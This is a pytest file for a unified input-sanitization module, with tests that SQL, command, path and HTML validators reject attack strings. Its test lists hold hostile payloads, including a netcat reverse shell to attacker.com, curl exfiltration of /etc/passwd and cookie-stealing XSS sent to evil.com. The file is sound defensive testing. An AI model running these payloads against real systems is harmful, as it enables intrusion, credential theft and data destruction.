"""Unit tests for unified sanitization module.

Tests all validators for:
- Normal operation
- Attack vector detection
- Edge cases
- Error handling

Security tests ensure detection of:
- SQL injection (OWASP A03)
- Command injection (OWASP A03)
- Path traversal (OWASP A01)
- XSS (OWASP A07)

Author: Artemis (Implementation)
Created: 2025-12-07 (Issue #22: Unified Sanitization)
"""

import pytest

from src.security.sanitization import (
    CommandValidator,
    HTMLValidator,
    IdentifierValidator,
    JSONValidator,
    PathValidator,
    SQLValidator,
    Sanitizer,
    Severity,
    StringValidator,
    ValidationResult,
    get_sanitizer,
)
from src.security.sanitization.exceptions import (
    CommandInjectionError,
    PathTraversalError,
    SanitizationError,
    SQLInjectionError,
)
from src.security.sanitization.validators import (
    sanitize_html,
    validate_command_safe,
    validate_path_safe,
    validate_sql_safe,
)


class TestStringValidator:
    """Tests for StringValidator."""

    def test_valid_string(self) -> None:
        """Test valid string passes validation."""
        validator = StringValidator()
        result = validator.validate("Hello World")
        assert result.is_valid is True
        assert result.sanitized_value == "Hello World"
        assert result.severity == Severity.INFO

    def test_strips_whitespace(self) -> None:
        """Test whitespace stripping."""
        validator = StringValidator(strip_whitespace=True)
        result = validator.validate("  hello  ")
        assert result.is_valid is True
        assert result.sanitized_value == "hello"

    def test_length_validation(self) -> None:
        """Test length validation."""
        validator = StringValidator(max_length=5)
        result = validator.validate("toolongstring")
        assert result.is_valid is False
        assert result.severity == Severity.WARNING
        assert result.sanitized_value == "toolo"

    def test_min_length_validation(self) -> None:
        """Test minimum length validation."""
        validator = StringValidator(min_length=5)
        result = validator.validate("abc")
        assert result.is_valid is False
        assert result.severity == Severity.WARNING

    def test_empty_string_not_allowed(self) -> None:
        """Test empty string rejection when not allowed."""
        validator = StringValidator(allow_empty=False)
        result = validator.validate("")
        assert result.is_valid is False
        assert result.severity == Severity.WARNING

    def test_null_byte_detection(self) -> None:
        """Test NULL byte injection detection."""
        validator = StringValidator()
        result = validator.validate("hello\x00world")
        assert result.is_valid is False
        assert result.severity == Severity.CRITICAL
        assert "NULL byte" in (result.error_message or "")

    def test_type_validation(self) -> None:
        """Test type validation."""
        validator = StringValidator()
        result = validator.validate(12345)
        assert result.is_valid is False
        assert result.severity == Severity.CRITICAL


class TestIdentifierValidator:
    """Tests for IdentifierValidator."""

    def test_valid_identifier(self) -> None:
        """Test valid identifier passes."""
        validator = IdentifierValidator()
        result = validator.validate("my-agent-123")
        assert result.is_valid is True
        assert result.sanitized_value == "my-agent-123"

    def test_valid_identifier_underscore(self) -> None:
        """Test underscore in identifier."""
        validator = IdentifierValidator()
        result = validator.validate("my_agent_id")
        assert result.is_valid is True

    def test_invalid_identifier_starts_number(self) -> None:
        """Test identifier starting with number fails."""
        validator = IdentifierValidator()
        result = validator.validate("123agent")
        assert result.is_valid is False
        assert result.severity == Severity.CRITICAL

    def test_invalid_identifier_special_chars(self) -> None:
        """Test special characters in identifier."""
        validator = IdentifierValidator()
        result = validator.validate("agent@id!")
        assert result.is_valid is False

    def test_empty_identifier(self) -> None:
        """Test empty identifier fails."""
        validator = IdentifierValidator()
        result = validator.validate("")
        assert result.is_valid is False
        assert result.severity == Severity.CRITICAL


class TestSQLValidator:
    """Tests for SQLValidator and SQL injection prevention."""

    def test_safe_input(self) -> None:
        """Test safe input passes."""
        validator = SQLValidator(strict_mode=False)
        result = validator.validate("John Doe")
        assert result.is_valid is True
        assert result.sanitized_value == "John Doe"

    @pytest.mark.parametrize(
        "attack_input",
        [
            "'; DROP TABLE users;--",
            "1' OR '1'='1",
            "admin'--",
            "1; DELETE FROM users",
            "' UNION SELECT * FROM passwords--",
            "'; EXEC xp_cmdshell('dir');--",
        ],
    )
    def test_sql_injection_attacks_detected(self, attack_input: str) -> None:
        """Test SQL injection attacks are detected."""
        validator = SQLValidator()
        result = validator.validate(attack_input)
        assert result.is_valid is False
        assert result.severity == Severity.CRITICAL
        assert result.details is not None
        assert result.details.get("security_event") == "sql_injection_attempt"

    def test_length_validation(self) -> None:
        """Test length validation."""
        validator = SQLValidator(max_length=10)
        result = validator.validate("a" * 100)
        assert result.is_valid is False
        assert result.severity == Severity.WARNING

    def test_validate_sql_safe_function(self) -> None:
        """Test convenience function raises on injection."""
        with pytest.raises(SQLInjectionError):
            validate_sql_safe("'; DROP TABLE users;--")

    def test_validate_sql_safe_returns_value(self) -> None:
        """Test convenience function returns value for safe input."""
        # Note: strict mode removes underscores as suspicious
        result = validate_sql_safe("safevalue")
        assert result == "safevalue"


class TestCommandValidator:
    """Tests for CommandValidator and command injection prevention."""

    def test_allowed_command(self) -> None:
        """Test allowed command passes."""
        validator = CommandValidator()
        result = validator.validate("pytest tests/")
        assert result.is_valid is True

    @pytest.mark.parametrize(
        "attack_input",
        [
            "; rm -rf /",
            "| cat /etc/passwd",
            "`whoami`",
            "$(id)",
            "test && curl evil.com",
            "test; wget malware.sh",
        ],
    )
    def test_command_injection_attacks_detected(self, attack_input: str) -> None:
        """Test command injection attacks are detected."""
        validator = CommandValidator()
        result = validator.validate(attack_input)
        assert result.is_valid is False
        assert result.severity == Severity.CRITICAL

    def test_disallowed_command(self) -> None:
        """Test disallowed command fails."""
        validator = CommandValidator(allowed_commands={"pytest"})
        result = validator.validate("rm -rf /")
        assert result.is_valid is False
        assert result.severity == Severity.CRITICAL

    def test_validate_command_safe_raises(self) -> None:
        """Test convenience function raises on injection."""
        with pytest.raises(CommandInjectionError):
            validate_command_safe("; rm -rf /")


class TestPathValidator:
    """Tests for PathValidator and path traversal prevention."""

    def test_safe_path(self) -> None:
        """Test safe path passes."""
        validator = PathValidator()
        result = validator.validate("uploads/file.txt")
        assert result.is_valid is True
        assert result.sanitized_value == "uploads/file.txt"

    @pytest.mark.parametrize(
        "attack_input",
        [
            "../etc/passwd",
            "..\\windows\\system32",
            "....//....//etc/passwd",
            "%2e%2e/etc/passwd",
            "..%2fetc/passwd",
            "..%5c..%5cwindows",
        ],
    )
    def test_path_traversal_attacks_detected(self, attack_input: str) -> None:
        """Test path traversal attacks are detected."""
        validator = PathValidator()
        result = validator.validate(attack_input)
        assert result.is_valid is False
        assert result.severity == Severity.CRITICAL

    def test_absolute_path_rejected_by_default(self) -> None:
        """Test absolute paths rejected by default."""
        validator = PathValidator()
        result = validator.validate("/etc/passwd")
        assert result.is_valid is False
        # Path traversal patterns like /etc/passwd are CRITICAL
        assert result.severity in (Severity.WARNING, Severity.CRITICAL)

    def test_null_byte_in_path(self) -> None:
        """Test NULL byte in path detected."""
        validator = PathValidator()
        result = validator.validate("file.txt\x00.jpg")
        assert result.is_valid is False
        assert result.severity == Severity.CRITICAL

    def test_validate_path_safe_raises(self) -> None:
        """Test convenience function raises on traversal."""
        with pytest.raises(PathTraversalError):
            validate_path_safe("../../etc/passwd")


class TestHTMLValidator:
    """Tests for HTMLValidator and XSS prevention."""

    def test_safe_text(self) -> None:
        """Test safe text passes and is escaped."""
        validator = HTMLValidator(preset="strict")
        result = validator.validate("Hello World")
        assert result.is_valid is True
        assert result.sanitized_value == "Hello World"

    def test_html_escaped_in_strict_mode(self) -> None:
        """Test HTML is escaped in strict mode."""
        validator = HTMLValidator(preset="strict")
        result = validator.validate("<p>Hello</p>")
        assert result.is_valid is False  # Tags not allowed in strict
        assert "&lt;p&gt;" in (result.sanitized_value or "")

    @pytest.mark.parametrize(
        "attack_input",
        [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "javascript:alert(1)",
            '<a href="javascript:alert(1)">click</a>',
            "<iframe src='evil.com'></iframe>",
        ],
    )
    def test_xss_attacks_detected(self, attack_input: str) -> None:
        """Test XSS attacks are detected."""
        validator = HTMLValidator()
        result = validator.validate(attack_input)
        assert result.is_valid is False
        assert result.severity == Severity.CRITICAL

    def test_sanitize_html_function(self) -> None:
        """Test convenience function."""
        result = sanitize_html("<script>evil</script>")
        assert "<script>" not in result
        assert "evil" in result  # Content preserved, tags removed


class TestJSONValidator:
    """Tests for JSONValidator."""

    def test_valid_json_string(self) -> None:
        """Test valid JSON string passes."""
        validator = JSONValidator()
        result = validator.validate('{"key": "value"}')
        assert result.is_valid is True
        assert result.sanitized_value == {"key": "value"}

    def test_valid_json_dict(self) -> None:
        """Test valid dict passes."""
        validator = JSONValidator()
        result = validator.validate({"key": "value"})
        assert result.is_valid is True

    def test_invalid_json_string(self) -> None:
        """Test invalid JSON fails."""
        validator = JSONValidator()
        result = validator.validate("{invalid}")
        assert result.is_valid is False
        assert result.severity == Severity.CRITICAL

    def test_depth_limit(self) -> None:
        """Test depth limit enforcement."""
        validator = JSONValidator(max_depth=2)
        deep_json = {"a": {"b": {"c": {"d": "too deep"}}}}
        result = validator.validate(deep_json)
        assert result.is_valid is False
        assert "depth" in (result.error_message or "").lower()

    def test_required_keys(self) -> None:
        """Test required keys validation."""
        validator = JSONValidator(required_keys={"id", "name"})
        result = validator.validate({"id": 1})
        assert result.is_valid is False
        assert "name" in (result.error_message or "")


class TestSanitizer:
    """Tests for Sanitizer facade."""

    def test_singleton_instance(self) -> None:
        """Test singleton returns same instance."""
        s1 = get_sanitizer()
        s2 = get_sanitizer()
        assert s1 is s2

    def test_list_validators(self) -> None:
        """Test all validators are registered."""
        sanitizer = Sanitizer()
        validators = sanitizer.list_validators()
        assert "string" in validators
        assert "sql" in validators
        assert "command" in validators
        assert "path" in validators
        assert "html" in validators
        assert "json" in validators
        assert "identifier" in validators

    def test_validate_with_type(self) -> None:
        """Test validate method with validator type."""
        sanitizer = Sanitizer()
        result = sanitizer.validate("test", "string")
        assert result.is_valid is True

    def test_sanitize_string_convenience(self) -> None:
        """Test sanitize_string convenience method."""
        sanitizer = Sanitizer()
        result = sanitizer.sanitize_string("  hello  ")
        assert result == "hello"

    def test_sanitize_sql_raises_on_injection(self) -> None:
        """Test sanitize_sql raises on injection."""
        sanitizer = Sanitizer()
        with pytest.raises(SanitizationError):
            sanitizer.sanitize_sql("'; DROP TABLE users;--")

    def test_validate_command_raises_on_injection(self) -> None:
        """Test validate_command raises on injection."""
        sanitizer = Sanitizer()
        with pytest.raises(SanitizationError):
            sanitizer.validate_command("; rm -rf /")

    def test_sanitize_path_raises_on_traversal(self) -> None:
        """Test sanitize_path raises on traversal."""
        sanitizer = Sanitizer()
        with pytest.raises(SanitizationError):
            sanitizer.sanitize_path("../../etc/passwd")

    def test_sanitize_html_returns_escaped(self) -> None:
        """Test sanitize_html returns escaped content for safe input."""
        sanitizer = Sanitizer()
        # Safe HTML in basic mode (XSS still raises)
        result = sanitizer.sanitize_html("<p>Hello</p>", preset="basic")
        # In strict mode, tags are not allowed
        # In basic mode, p tags are allowed
        assert "Hello" in result

    def test_validate_json_returns_parsed(self) -> None:
        """Test validate_json returns parsed JSON."""
        sanitizer = Sanitizer()
        result = sanitizer.validate_json('{"key": "value"}')
        assert result == {"key": "value"}


class TestValidationResult:
    """Tests for ValidationResult dataclass."""

    def test_success_factory(self) -> None:
        """Test success factory method."""
        result = ValidationResult.success("value")
        assert result.is_valid is True
        assert result.sanitized_value == "value"
        assert result.severity == Severity.INFO
        assert result.error_message is None

    def test_failure_factory(self) -> None:
        """Test failure factory method."""
        result = ValidationResult.failure("error message")
        assert result.is_valid is False
        assert result.error_message == "error message"
        assert result.severity == Severity.CRITICAL

    def test_immutability(self) -> None:
        """Test ValidationResult is immutable."""
        result = ValidationResult.success("value")
        with pytest.raises(AttributeError):
            result.is_valid = False  # type: ignore


class TestSecurityAttackVectors:
    """Comprehensive security tests with known attack vectors."""

    # OWASP Top 10 2021 attack vectors
    OWASP_SQL_INJECTION_VECTORS = [
        "'; DROP TABLE users;--",
        "1' OR '1'='1",
        "admin'/*",
        "1; DELETE FROM users WHERE 1=1;--",
        "' UNION SELECT username, password FROM users--",
        "1' AND 1=(SELECT COUNT(*) FROM users)--",
    ]

    OWASP_COMMAND_INJECTION_VECTORS = [
        "; cat /etc/passwd",
        "| nc -e /bin/sh attacker.com 4444",
        "`wget http://evil.com/shell.sh`",
        "$(curl http://evil.com/exfiltrate?data=$(cat /etc/passwd))",
        "& ping -c 10 attacker.com",
    ]

    OWASP_PATH_TRAVERSAL_VECTORS = [
        "../../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//etc/passwd",
        "..%252f..%252f..%252fetc/passwd",
        "%00../etc/passwd",
    ]

    OWASP_XSS_VECTORS = [
        "<script>document.location='http://evil.com/steal?c='+document.cookie</script>",
        "<img src=x onerror=alert(document.domain)>",
        "<svg/onload=fetch('http://evil.com/'+document.cookie)>",
        "javascript:alert(1)//",
        "<body onload=alert(1)>",
    ]

    def test_all_sql_injection_vectors_blocked(self) -> None:
        """Test all OWASP SQL injection vectors are blocked."""
        validator = SQLValidator()
        for vector in self.OWASP_SQL_INJECTION_VECTORS:
            result = validator.validate(vector)
            assert not result.is_valid, f"SQL injection not detected: {vector}"
            assert result.severity == Severity.CRITICAL

    def test_all_command_injection_vectors_blocked(self) -> None:
        """Test all OWASP command injection vectors are blocked."""
        validator = CommandValidator()
        for vector in self.OWASP_COMMAND_INJECTION_VECTORS:
            result = validator.validate(vector)
            assert not result.is_valid, f"Command injection not detected: {vector}"
            assert result.severity == Severity.CRITICAL

    def test_all_path_traversal_vectors_blocked(self) -> None:
        """Test all OWASP path traversal vectors are blocked."""
        validator = PathValidator()
        for vector in self.OWASP_PATH_TRAVERSAL_VECTORS:
            result = validator.validate(vector)
            assert not result.is_valid, f"Path traversal not detected: {vector}"
            assert result.severity == Severity.CRITICAL

    def test_all_xss_vectors_blocked(self) -> None:
        """Test all OWASP XSS vectors are blocked."""
        validator = HTMLValidator()
        for vector in self.OWASP_XSS_VECTORS:
            result = validator.validate(vector)
            assert not result.is_valid, f"XSS not detected: {vector}"
            assert result.severity == Severity.CRITICAL
